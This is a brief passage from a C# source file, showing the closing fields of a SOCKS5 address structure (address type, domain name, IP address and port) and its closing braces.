            public Socks5AddressType AddrType;
            public string FQDN;
            public IPAddress Ip;
            public int Port;
        }
    }
}
